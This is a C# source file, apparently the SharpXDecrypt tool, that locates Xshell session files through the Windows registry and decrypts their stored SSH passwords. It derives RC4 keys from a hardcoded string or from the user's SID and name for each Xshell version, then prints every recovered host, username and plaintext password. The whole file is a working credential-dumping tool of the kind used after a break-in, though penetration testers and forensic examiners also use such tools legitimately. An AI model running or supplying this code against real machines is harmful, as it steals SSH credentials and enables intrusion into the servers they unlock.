using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace SharpXDecrypt
{
    class XClass
    {
        public struct Xsh
        {
            public string host;
            public string userName;
            public string password;
            public string encryptPw;
            public string version;
        }
        static private Boolean enableMaterPasswd = false;
        static private string hashMasterPasswd = null;
        public static Boolean Decrypt()
        {
            List<string> userDataPaths = GetUserDataPath();
            if (userDataPaths.Count > 0)
            {
                Utils.UserSID userSID = Utils.GetUserSID();
                foreach (string userDataPath in userDataPaths)
                {
                    CheckMasterPw(userDataPath);
                    List<string> xshPathList = EnumXshPath(userDataPath);
                    foreach (string xshPath in xshPathList)
                    {
                        Xsh xsh = XSHParser(xshPath);
                        if (xsh.encryptPw != null)
                        {
                            Console.WriteLine("  XSHPath: " + xshPath);
                            xsh.password = Xdecrypt(xsh, userSID);
                            Console.WriteLine("  Host: " + xsh.host);
                            Console.WriteLine("  UserName: " + xsh.userName);
                            Console.WriteLine("  Password: " + xsh.password);
                            Console.WriteLine("  Version: " + xsh.version);
                            Console.WriteLine();
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("[-] UserPath Not Found!");
                Console.WriteLine("[-] Please try : .\\SharpXDecrypt.exe \"[SessionsPath]\"");
            }

            return true;
        }
        public static Boolean Decrypt(string selectPath)
        {
            Utils.UserSID userSID = Utils.GetUserSID();               
            List<string> xshPathList = EnumXshPath(selectPath);
            foreach (string xshPath in xshPathList)
            {
                Xsh xsh = XSHParser(xshPath);
                if (xsh.encryptPw != null)
                {
                    Console.WriteLine("  XSHPath: " + xshPath);
                    xsh.password = Xdecrypt(xsh, userSID);
                    Console.WriteLine("  Host: " + xsh.host);
                    Console.WriteLine("  UserName: " + xsh.userName);
                    Console.WriteLine("  Password: " + xsh.password);
                    Console.WriteLine("  Version: " + xsh.version);
                    Console.WriteLine();
                }
            }   
            return true;
        }
        public static string Xdecrypt(Xsh xsh, Utils.UserSID userSID)
        {
            string password = null;
            if (!enableMaterPasswd)
            {
                if (xsh.version.StartsWith("5.0") || xsh.version.StartsWith("4") || xsh.version.StartsWith("3") || xsh.version.StartsWith("2"))
                {
                    byte[] data = Convert.FromBase64String(xsh.encryptPw);
                    byte[] Key = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes("!X@s#h$e%l^l&"));
                    byte[] passData = new byte[data.Length - 0x20];
                    Array.Copy(data, 0, passData, 0, data.Length - 0x20);
                    byte[] decrypted = RC4.Decrypt(Key, passData);
                    password = Encoding.ASCII.GetString(decrypted);
                }
                else if (xsh.version.StartsWith("5.1") || xsh.version.StartsWith("5.2"))
                {
                    byte[] data = Convert.FromBase64String(xsh.encryptPw);
                    byte[] Key = new SHA256Managed().ComputeHash(Encoding.ASCII.GetBytes(userSID.SID));
                    byte[] passData = new byte[data.Length - 0x20];
                    Array.Copy(data, 0, passData, 0, data.Length - 0x20);
                    byte[] decrypted = RC4.Decrypt(Key, passData);
                    password = Encoding.ASCII.GetString(decrypted);
                }
                else if (xsh.version.StartsWith("5") || xsh.version.StartsWith("6") || xsh.version.StartsWith("7.0"))
                {
                    byte[] data = Convert.FromBase64String(xsh.encryptPw);
                    byte[] Key = new SHA256Managed().ComputeHash(Encoding.Default.GetBytes(userSID.Name + userSID.SID));
                    byte[] passData = new byte[data.Length - 0x20];
                    Array.Copy(data, 0, passData, 0, data.Length - 0x20);
                    byte[] decrypted = RC4.Decrypt(Key, passData);
                    password = Encoding.Default.GetString(decrypted);
                }else if (xsh.version.StartsWith("7"))
                {
                    string strkey1 = new string(userSID.Name.ToCharArray().Reverse().ToArray()) + userSID.SID;
                    string strkey2 = new string(strkey1.ToCharArray().Reverse().ToArray());
                    byte[] data = Convert.FromBase64String(xsh.encryptPw);
                    byte[] Key = new SHA256Managed().ComputeHash(Encoding.Default.GetBytes(strkey2));
                    byte[] passData = new byte[data.Length - 0x20];
                    Array.Copy(data, 0, passData, 0, data.Length - 0x20);
                    byte[] decrypted = RC4.Decrypt(Key, passData);
                    password = Encoding.Default.GetString(decrypted);
                }
            }
            else
            {
                Console.WriteLine("  MasterPassword Enable !");
            }
            return password;
        }

        public static void DecryptMasterPw()
        {

        }
        public static Xsh XSHParser(string xshPath)
        {
            Xsh xsh;
            xsh.host = null;
            xsh.userName = null;
            xsh.password = null;
            xsh.version = null;
            xsh.encryptPw = null; 
            using (StreamReader sr = new StreamReader(xshPath))
            {
                string rawPass;
                while ((rawPass = sr.ReadLine()) != null)
                {
                    if (System.Text.RegularExpressions.Regex.IsMatch(rawPass, @"Host=(.*?)"))
                    {
                        xsh.host = rawPass.Replace("Host=", "");
                    }
                    if (System.Text.RegularExpressions.Regex.IsMatch(rawPass, @"Password=(.*?)"))
                    {
                        rawPass = rawPass.Replace("Password=", "");
                        rawPass = rawPass.Replace("\r\n", "");
                        if (rawPass.Equals(""))
                        {
                            continue;
                        }
                        xsh.encryptPw = rawPass;
                    }
                    if (System.Text.RegularExpressions.Regex.IsMatch(rawPass, @"UserName=(.*?)"))
                    {
                        xsh.userName = rawPass.Replace("UserName=", "");
                    }
                    if (System.Text.RegularExpressions.Regex.IsMatch(rawPass, @"Version=(.*?)"))
                    {
                        xsh.version = rawPass.Replace("Version=", "");
                    }
                }
            }
            return xsh;
        }


        public static List<string> EnumXshPath(string userDataPath)
        {
            List<string> xshPathList = new List<string>();
            string sessionsPath = "";
            if (userDataPath.EndsWith("7") || userDataPath.EndsWith("6") || userDataPath.EndsWith("5"))
            {
                sessionsPath = userDataPath + "\\Xshell\\Sessions";
            }
            else
            {
                sessionsPath = userDataPath;
            }
            if (Directory.Exists(sessionsPath))//判断是否存在
            {
                DirectoryInfo directoryInfo = new DirectoryInfo(sessionsPath);
                FileInfo[] files = directoryInfo.GetFiles("*.xsh", SearchOption.AllDirectories);
                foreach (FileInfo fileInfo in files)
                {
                    string name = fileInfo.Name;
                    if (fileInfo.Extension.Equals(".xsh"))
                    {
                        xshPathList.Add(fileInfo.FullName);
                    }
                }
            }
            return xshPathList;
        }
        public static List<string> GetUserDataPath()
        {
            Console.WriteLine("[*] Start GetUserPath....");
            List<string> userDataPath = new List<string>();
            string strRegPath = @"Software\\NetSarang\\Common";
            RegistryKey regRootKey;
            RegistryKey regSubKey;
            regRootKey = Registry.CurrentUser;
            regSubKey = regRootKey.OpenSubKey(strRegPath);
            foreach (string version in regSubKey.GetSubKeyNames())
            {
                if (version.StartsWith("5") || version.StartsWith("6") || version.StartsWith("7"))
                {
                    try
                    {
                        string strUserDataRegPath = strRegPath + "\\" + version + "\\UserData";
                        regSubKey = regRootKey.OpenSubKey(strUserDataRegPath);
                        Console.WriteLine("  UserPath: " + regSubKey.GetValue("UserDataPath"));
                        userDataPath.Add(regSubKey.GetValue("UserDataPath").ToString());
                    }
                    catch (NullReferenceException e)
                    {

                    }
                }
            }
            regSubKey.Close();
            regRootKey.Close();
            Console.WriteLine("[*] Get UserPath Success !");
            Console.WriteLine();
            return userDataPath;
        }
        public static void CheckMasterPw(string userDataPath)
        {
            string masterPwPath = userDataPath + "\\common\\MasterPassword.mpw";
            using (StreamReader sr = new StreamReader(masterPwPath))
            {
                string rawPass;
                while ((rawPass = sr.ReadLine()) != null)
                {
                    if (System.Text.RegularExpressions.Regex.IsMatch(rawPass, @"EnblMasterPasswd=(.*?)"))
                    {
                        rawPass = rawPass.Replace("EnblMasterPasswd=", "");
                        if (rawPass.Equals("1"))
                        {
                            enableMaterPasswd = true;
                        }
                        else
                        {
                            enableMaterPasswd = false;
                        }
                    }
                    if (System.Text.RegularExpressions.Regex.IsMatch(rawPass, @"HashMasterPasswd=(.*?)"))
                    {
                        rawPass = rawPass.Replace("HashMasterPasswd=", "");
                        if (rawPass.Length > 1)
                        {
                            hashMasterPasswd = rawPass;
                        }
                        else
                        {
                            hashMasterPasswd = null;
                        }
                    }
                }
            }
        }
    }
}
